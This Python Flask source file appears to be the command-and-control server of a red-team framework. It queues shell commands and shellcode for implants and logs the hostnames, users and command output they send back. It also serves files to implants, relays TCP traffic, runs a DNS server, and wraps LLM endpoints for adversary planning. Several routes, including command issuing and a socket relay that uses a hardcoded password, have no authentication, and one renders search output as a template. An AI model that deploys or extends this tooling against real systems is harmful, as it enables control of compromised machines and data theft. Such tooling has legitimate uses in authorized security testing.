import re
import os
import csv
import sys
import json
import yaml
import glob
import socket
import base64
import logging
import markdown
import threading
import pandas as pd
from functools import wraps
from lazyown import LazyOwnShell
from dnslib.server import DNSServer, DNSLogger
from jinja2 import Environment, FileSystemLoader
from modules.lazygptcli2 import process_prompt, Groq
from modules.lazygptvulns import process_prompt_vuln
from modules.lazygpttask import process_prompt_task
from modules.lazyredopgpt import process_prompt_redop
from modules.lazyagentAi import process_prompt_search
from modules.lazygptcli3 import process_prompt_script
from modules.lazygptcli4 import process_prompt_adversary
from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash

def fromjson(value):
    return json.loads(value)

BASE_DIR = os.getcwd()
BASE_DIR += "/sessions/"
ALLOWED_DIRECTORY = BASE_DIR
shell = LazyOwnShell()
shell.onecmd('p')
shell.onecmd('create_session_json')

if len(sys.argv) > 3:
    lport = sys.argv[1]
    USERNAME = sys.argv[2]
    PASSWORD = sys.argv[3]
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port, user & pass as argument")
    sys.exit(2)

app = Flask(__name__, static_folder='static')
app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
app.jinja_env.filters['fromjson'] = fromjson
implants = {"implants": []}
commands = {}
results = {}
commands_history = {}
remote_commands_history = {}
connected_clients = set()
path = os.getcwd()
atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
with open('payload.json', 'r') as file:
    config = json.load(file)
    api_key = config.get("api_key")
    route_maleable = config.get("c2_maleable_route")
    win_useragent_maleable = config.get("user_agent_win")
    lin_useragent_maleable = config.get("user_agent_lin")
    rhost = config.get("rhost")

implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
logging.info(implant_files)
if implant_files:
    for i, file in enumerate(implant_files, start=1):
        try:
            with open(file, 'r') as f:
                logging.info("Info: Implants created.")
                content = f.read().strip()
                implants["implants"].append({
                    "implant": i,
                    "content": content
                })
        except Exception as e:
            print(f"Error al leer el archivo {file}: {e}")

if not api_key:
    logging.error("Error: La API key no está configurada en el archivo payload.json")
    exit(1)

if not route_maleable:
    logging.error("Error: c2_maleable_route not found ond payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
    sys.exit(1)

if not os.path.exists(atomic_framework_path):
    shell.onecmd('atomic_tests')

client = Groq(api_key=api_key)

def load_tasks():
    if not os.path.exists('sessions/tasks.json'):
        with open('sessions/tasks.json', 'w') as file:
            json.dump([], file)
    with open('sessions/tasks.json', 'r') as file:
        return json.load(file)

def save_tasks(tasks):
    with open('sessions/tasks.json', 'w') as file:
        json.dump(tasks, file, indent=4)

def load_note():
    file_path = 'sessions/notes.txt'
    if not os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write(json.dumps({"content": ""}))

    with open(file_path, 'r') as file:
        notes = file.read().strip()

    if not notes:
        return {"content": ""}

    try:
        return json.loads(notes)
    except json.JSONDecodeError:
        return {"content": ""}

def save_note(content):
    file_path = 'sessions/notes.txt'
    with open(file_path, 'w') as file:
        file.write(json.dumps({"content": content}))
       


def markdown_to_html(text):
    return markdown.markdown(text)

env = Environment(loader=FileSystemLoader('templates'))

env.filters['markdown'] = markdown_to_html

app.jinja_env.filters['markdown'] = markdown_to_html

def to_serializable(obj):
    """Convert objects to serializable format."""
    if isinstance(obj, (list, dict, str, int, float, bool, type(None))):
        return obj
    return str(obj)

def make_serializable(data):
    """Recursively convert data to serializable format."""
    if isinstance(data, dict):
        return {k: make_serializable(v) for k, v in data.items()}
    elif isinstance(data, list):
        return [make_serializable(item) for item in data]
    else:
        return to_serializable(data)

@app.template_filter('tojson')
def tojson_filter(value, **kwargs):
    """Custom tojson filter to handle non-serializable objects."""
    return json.dumps(make_serializable(value), **kwargs)

def escape_js_string(value):
    """Escape special characters in a string for JavaScript."""
    if isinstance(value, str):
        value = re.sub(r'([\\"\'])', r'\\\1', value)
        value = re.sub(r'\n', r'\\n', value)
        value = re.sub(r'\r', r'\\r', value)
    return value

def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solicita autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def start_dns_server():
    """
    Inicia un servidor DNS que responde con registros específicos para varios subdominios.
    """
    class CustomDNSResolver:
        def resolve(self, request, handler):
            reply = request.reply()
            qname = request.q.qname
            qtype = request.q.qtype

            subdomain_responses = {
                "info.esporalibre.cl.": {
                    QTYPE.A: A("192.168.1.98"),
                    QTYPE.TXT: TXT("Información sobre esporalibre.cl")
                },
                "mail.esporalibre.cl.": {
                    QTYPE.A: A("192.168.1.98"),
                    QTYPE.MX: MX("mail.esporalibre.cl.")
                },
                "www.esporalibre.cl.": {
                    QTYPE.A: A("192.168.1.98"),
                    QTYPE.CNAME: CNAME("esporalibre.cl.")
                },
                "ns.esporalibre.cl.": {
                    QTYPE.NS: NS("ns.esporalibre.cl.")
                },
                "esporalibre.cl.": {
            
                    QTYPE.SOA: SOA(
                        "ns.esporalibre.cl.",    
                        "admin.esporalibre.cl.",  
                        (
                            1,    
                            3600, 
                            600,  
                            86400,
                            3600  
                        )
                    ),
                    QTYPE.MX: MX("mail.esporalibre.cl."),
                    QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
                    QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
                    QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
                    QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
                }
            }

            if str(qname) in subdomain_responses:
                if qtype in subdomain_responses[str(qname)]:
                    reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[str(qname)][qtype], ttl=300))
                else:
                    reply.header.rcode = 3
            else:
                reply.header.rcode = 3

            return reply

    resolver = CustomDNSResolver()
    logger = DNSLogger(prefix=False)
    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger)
    print("    [*] Server DNS started at port 53.")
    server.start()

@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    path = os.getcwd()
    sessions_dir = f'{path}/sessions'
    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
    if not json_files:
        return "No JSON files found in the sessions directory.", 404
    tasks = load_tasks()
    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        
        new_task = {
            'id': len(tasks),
            'title': title,
            'description': description,
            'operator': operator,
            'status': status
        }
        tasks.append(new_task)
        save_tasks(tasks)
        flash('Task created successfully!', 'success')
        return redirect(url_for('index'))

    latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
    json_path = os.path.join(sessions_dir, latest_json_file)

    with open(json_path, 'r') as f:
        session_data = json.load(f)

    
    if isinstance(session_data, list):
        session_data = session_data[0] if session_data else {}

    session_data['params'] = make_serializable(session_data.get('params', {}))

    connected_clients_list = list(connected_clients)
    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]

    commands_history = {}
    os_data = {}
    pid = {}
    hostname = {}
    ips = {}
    user = {}
    for client_id in connected_clients_list:
        csv_file = f"sessions/{client_id}.log"
        try:
            if os.path.isfile(csv_file):
                with open(csv_file, 'r') as f:
                    reader = csv.DictReader(f)
                    rows = list(reader)
                    if rows:
                        commands_history[client_id] = [rows[-1]]
                        os_data[client_id] = rows[-1]['os']
                        pid[client_id] = rows[-1]['pid']
                        hostname[client_id] = rows[-1]['hostname']
                        ips[client_id] = rows[-1]['ips']
                        user[client_id] = rows[-1]['user']
                        print(commands_history)
        except Exception as e:
            print("[Error] implant logs corrupted.")

    return render_template(
        'index.html',
        connected_clients=connected_clients_list,
        results=results,
        session_data=session_data,
        commands_history=commands_history,
        os_data=os_data,
        pid=pid,
        hostname=hostname,
        ips=ips,
        user=user,
        username=USERNAME,
        password=PASSWORD,
        c2_route=route_maleable,
        win_useragent=win_useragent_maleable,
        lin_useragent=lin_useragent_maleable,
        implants=implants,
        directories=directories,
        tasks=tasks
    )


@app.route('/command/<client_id>', methods=['GET'])
@app.route(f'{route_maleable}<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id)
    if client_id in commands:
        command = commands.pop(client_id)
        print(f"[INFO] Sending command to {client_id}: {command}")

        return command, 200
    return '', 204

@app.route('/command/<client_id>', methods=['POST'])
@app.route(f'{route_maleable}<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        data = request.json
        if data and 'output' in data and 'command' in data:
            output = data['output']
            client = data['client']
            pid = data['pid']
            hostname = data['hostname']
            ips = data['ips']
            user = data['user']
            command = data['command']
            if command and output:
                contentr = "client_id;os;pid;hostname;ips;user;command:output\n"
                contentr += f"{client_id};{client};{pid};{hostname};{ips};{user};{command};{output}\n"
                csv_file = f"sessions/{client_id}.log"
                file_exists = os.path.isfile(csv_file)
                with open(csv_file, 'a', newline='') as f:
                    writer = csv.writer(f)
                    if not file_exists:
                        writer.writerow(["client_id", "os", "pid", "hostname", "ips", "user", "command", "output"])
                    writer.writerow([client_id, client, pid, hostname, ips, user, command, output])

                results[client_id] = {
                    "output": output,
                    "client": client,
                    "pid": pid,
                    "hostname": hostname,
                    "ips": ips,
                    "user": user,
                    "command": command
                }

                print(f"[INFO] Received output from {client_id}: {output} Platform: {client}")
                return jsonify({"status": "success", "Platform": client}), 200
            else:
                return jsonify({"status": "empty", "Platform": client}), 200
        else:
            print(f"[ERROR] Invalid data received from {client_id}")
            return jsonify({"status": "error", "message": "Invalid data format"}), 400
    except json.JSONDecodeError:
        print(f"[ERROR] Invalid JSON received from {client_id}")
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception as e:
        print(f"[ERROR] Unexpected error processing request from {client_id}: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

@app.route('/issue_command', methods=['POST'])
def issue_command():
    client_id = request.form['client_id']
    command = request.form['command']

    commands[client_id] = command
    if client_id not in commands_history:
        commands_history[client_id] = []
    commands_history[client_id].append(command)

    return redirect(url_for('index'))

@app.route('/upload', methods=['GET', 'POST'])
@app.route(f'{route_maleable}upload', methods=['GET', 'POST'])
@requires_auth
def upload():
    """
    Handle file uploads securely.

    This function allows users to upload files and ensures that the uploaded filename is sanitized
    to prevent directory traversal and other vulnerabilities. Files are saved in a specified uploads directory.

    Returns:
        JSON response indicating the status of the upload or an HTML form for file upload.
    """
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400

        file = request.files['file']

        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        safe_filename = secure_filename(file.filename)
        path = os.getcwd()

        uploads_dir = os.path.join(path+"/sessions", 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)
        filepath = os.path.join(uploads_dir, safe_filename)
        file.save(filepath)
        print(f"[INFO] File uploaded: {safe_filename}")

        return jsonify({"status": "success", "message": f"File uploaded: {safe_filename}"}), 200

    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload a File</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    '''

@app.route('/view_yaml', methods=['POST'])
@requires_auth
def view_yaml():
    selected_directory = request.form.get('directory')
    if not selected_directory:
        return redirect(url_for('index'))

    yaml_data = []

    selected_path = os.path.join(atomic_framework_path, selected_directory)

    for root, dirs, files in os.walk(selected_path):
        for file in files:
            if file.endswith('.yaml'):
                yaml_file_path = os.path.join(root, file)
                with open(yaml_file_path, 'r') as file:
                    data = yaml.safe_load(file)
                    for test in data.get('atomic_tests', []):
                        yaml_data.append({
                            'auto_generated_guid': test.get('auto_generated_guid'),
                            'name': escape_js_string(test.get('name')),
                            'description': escape_js_string(test.get('description').replace('\n','<br>')),
                            'supported_platforms': test.get('supported_platforms')
                        })

    return render_template('yaml_view.html', yaml_data=yaml_data, directory=selected_directory)

@app.route('/download_file', methods=['POST'])
@app.route(f'{route_maleable}download_file', methods=['POST'])
def download_file():
    client_id = request.form['client_id']
    file = request.files['file']
    if file:
        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
        os.makedirs(temp_dir, exist_ok=True)
        file_path = os.path.join(temp_dir, file.filename)
        file.save(file_path)
        commands[client_id] = f"download:{file.filename}"

        return redirect(url_for('index'))
    else:
        return jsonify({"status": "error", "message": "No file selected"}), 400

@app.route('/download/<path:file_path>', methods=['GET'])
@app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
def serve_file(file_path):
    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
    full_file_path = os.path.join(temp_dir, file_path)
    if os.path.exists(full_file_path):
        try:
            file_name = os.path.basename(file_path)
            return send_from_directory(temp_dir, file_name, as_attachment=True)
        except Exception as e:
            return str(e), 500
    else:
        return jsonify({"status": "error", "message": "File not found"}), 404

@app.route('/api/run', methods=['POST'])
@requires_auth
def run_command():
    data = request.json
    command = data.get('command')

    if not command:
        return jsonify({"error": "No command provided"}), 400

    output = shell.one_cmd(command)
    print(f"[INFO]{output}")

    print(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"result": serializable_output}), 200

@app.route('/api/output', methods=['GET'])
def get_output():
    global shell
    output = shell.output

    print(f"[INFO] Type of output: {type(output)}")

    if isinstance(output, str):
        serializable_output = output
    elif isinstance(output, (int, float, bool, type(None))):
        serializable_output = str(output)
    elif isinstance(output, (list, dict)):
        serializable_output = output
    else:

        try:
            serializable_output = vars(output)
        except TypeError:
            serializable_output = str(output)

    return jsonify({"output": serializable_output})

@app.route('/run_shellcode', methods=['POST'])
@requires_auth
def run_shellcode():
    client_id = request.form['client_id']
    shellcode = request.form['shellcode']
    commands[client_id] = f"sc:{shellcode}"
    return redirect(url_for('index'))

@app.route('/get_results', methods=['GET'])
@requires_auth
def get_results():
    return jsonify(results)

@app.route('/lazyos/<ip>/<port>', methods=['POST'])
def send_lcommand(ip, port):
    try:
        command = request.json.get('command')
        password = "grisiscomebacksayknokknok"
        if not command:
            return jsonify({"error": "No command provided"}), 400

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, int(port)))
            s.sendall(password.encode())
            response = s.recv(1024).decode()
            s.sendall(command.encode())
            response = s.recv(1024).decode()

        return jsonify({"response": response})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/chatbot', methods=['POST'])
def chatbot():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "El prompt es requerido"}), 400

    response = process_prompt(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/vuln', methods=['POST'])
def vuln():
    data = request.json
    file = f"{path}/sessions/vulns_{rhost}.nmap"
    print(file)
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_vuln(client, file, debug)
    with open(f"{BASE_DIR}/plan.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/taskbot', methods=['POST'])
def taskbot():
    data = request.json
    file = f"{path}/sessions/tasks.json"
    print(file)
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_task(client, file, debug)

    return jsonify({"response": response})

@app.route('/search', methods=['POST'])
def search():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "El prompt es requerido"}), 400

    response = process_prompt_search(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/script', methods=['POST'])
def script():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "El prompt es requerido"}), 400

    response = process_prompt_script(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/redop', methods=['POST'])
def redop():
    data = request.json
    file = f"{path}/sessions/sessionLazyOwn.json"
    print(file)
    debug = data.get('debug', True)
    if not file:
        return jsonify({"error": "El file es requerido"}), 400
    response = process_prompt_redop(client, file, debug)
    with open(f"{BASE_DIR}/status_redop.txt", 'w') as f:
       f.write(response)
       f.close()
    shell.onecmd('create_session_json')
    return jsonify({"response": response})

@app.route('/adversary', methods=['POST'])
def adversary():
    data = request.json
    prompt = data.get('prompt')
    debug = data.get('debug', False)
    if not prompt:
        return jsonify({"error": "El prompt es requerido"}), 400

    response = process_prompt_adversary(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/csv_to_html', methods=['POST'])
def csv_to_html():
    file_path = request.json.get('file_path')
    if not file_path:
        return jsonify({"error": "No file path provided"}), 400

    if not file_path.startswith(os.path.realpath(ALLOWED_DIRECTORY)):
        return jsonify({"error": "Invalid file path"}), 403

    sanitized_file_path = os.path.normpath(file_path)
    sanitized_file_path = os.path.realpath(sanitized_file_path)
    sanitized_file_path = sanitized_file_path.replace("../","").replace("....//","")
    relative_path = os.path.relpath(sanitized_file_path, ALLOWED_DIRECTORY)
    if '..' in relative_path:
        return jsonify({"error": str('na na naa, you need the correct passwrd')}), 403
    try:
        with open(sanitized_file_path, 'r') as file:
            reader = csv.reader(file)
            headers = next(reader)
            rows = list(reader)

            html = '<table border="1"><tr>'
            html += ''.join(f'<th>{header}</th>' for header in headers)
            html += '</tr>'

            for row in rows:
                html += '<tr>'
                html += ''.join(f'<td>{cell}</td>' for cell in row)
                html += '</tr>'

            html += '</table>'

            return html

    except Exception as e:
        return jsonify({"error": str(e)}), 500

def search_database(term, data_path="parquets/techniques.parquet"):
    """
    Busca un término en un DataFrame, manejando listas y structs correctamente.

    Args:
        term (str): El término de búsqueda.
        data_path (str, optional): Ruta al archivo Parquet.

    Returns:
        str: Contenido Markdown de los resultados, o mensaje de error.
    """
    try:
        df = pd.read_parquet(data_path)
    except FileNotFoundError:
        return f"Error: File not found {data_path}"
    except ValueError as e:
        return f"Error reading Parquet: {e}"

    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, list)).any():
            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)

    struct_cols_to_drop = []
    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, dict)).any():
            struct_cols_to_drop.append(col)
            df = pd.concat([df.drop(columns=[col]), df[col].apply(pd.Series).add_prefix(f"{col}.")], axis=1)

    term_lower = term.lower()
    results = df[df.apply(lambda row: row.astype(str).str.lower().str.contains(term_lower).any(), axis=1)]

    md_content = ""
    if not results.empty:
        for _, row in results.iterrows():
            md_content += f"# Result {_ + 1}\n"  # Añade un título para cada resultado
            for key, value in row.items():
                md_content += f"- **{key}**: {value}\n"
            md_content += "\n"
    else:
        md_content = f"No Results for: '{term}'\n"

    return md_content

@app.route('/search_results', methods=['POST'])
def search_results():
    term = request.form.get('input')
    md_content = search_database(term,"parquets/techniques.parquet")
    html_content = markdown.markdown(md_content)
    md_content_d = search_database(term,"parquets/detalles.parquet")
    html_content2 = markdown.markdown(md_content_d)
    md_content_b = search_database(term,"parquets/binarios.parquet")
    html_content3 = markdown.markdown(md_content_b)
    return render_template_string(html_content+html_content2+html_content3)

@app.route('/graph')
def graph():
    return render_template('graph.html')

@app.route('/task/<int:task_id>')
def task(task_id):
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))
    task_description = markdown.markdown(task['description'])
    return render_template('task.html', task=task, task_description=task_description)

@app.route('/gettasks', methods=['GET'])
def get_tasks():
    tasks = load_tasks()
    return jsonify(tasks)
    
@app.route('/task/<int:task_id>/edit', methods=['GET', 'POST'])
def edit_task(task_id):
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        task['title'] = title
        task['description'] = description
        task['operator'] = operator
        task['status'] = status

        save_tasks(tasks)
        flash('Task updated successfully!', 'success')
        return redirect(url_for('task', task_id=task_id))

    task_description = markdown.markdown(task['description'])
    return render_template('edit_task.html', task=task, task_description=task_description)

@app.route('/notes', methods=['GET', 'POST'])
def edit_notes():
    if request.method == 'POST':
        content = str(request.form['content'])
        notes = content
        save_note(notes)
        flash('Notes updated successfully!', 'success')
        shell.onecmd('create_session_json')
        return redirect(url_for('view_note'))

    notes = load_note()
    return render_template('edit_note.html', note=notes)

@app.route('/getnotes', methods=['GET'])
def get_notes():
    notes = load_note()
    return jsonify(notes)

@app.route('/view_note')
def view_note():
    note = load_note()
    return render_template('view_note.html', note=note)

@app.route('/start_bridge', methods=['POST'])
@requires_auth
def start_bridge():
    """Start a TCP bridge to a specified remote host and port."""
    local_port = int(request.form['local_port'])
    remote_host = request.form['remote_host']
    remote_port = int(request.form['remote_port'])
    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
    bridge_thread.start()

    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200

def tcp_bridge(local_port, remote_host, remote_port):
    """Establish a TCP bridge between a local port and a remote host."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', local_port))
    server_socket.listen(5)
    print(f"[*] Listening for connections on port {local_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[INFO] Accepted connection from {addr}")

        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()

def handle_client(client_socket, remote_host, remote_port):
    """Handle communication between the client and the remote server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.connect((remote_host, remote_port))

        while True:

            client_data = client_socket.recv(4096)
            if not client_data:
                break
            server_socket.sendall(client_data)

            server_data = server_socket.recv(4096)
            if not server_data:
                break
            client_socket.sendall(server_data)

    client_socket.close()
def secure_filename(filename):
    """
    Sanitize the filename to prevent directory traversal and unauthorized access.

    :param filename: The original filename from the upload.
    :return: A sanitized filename that is safe for storage.
    """
    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
    return filename[:255]

if __name__ == '__main__':
    path = os.getcwd().replace("modules", "sessions" )
    uploads = f"{path}/uploads"
    dns_thread = threading.Thread(target=start_dns_server, daemon=True)
    dns_thread.start()
    if not os.path.exists(uploads):
        os.makedirs(uploads)
    app.run(host='0.0.0.0', port=lport, ssl_context=('cert.pem', 'key.pem'))
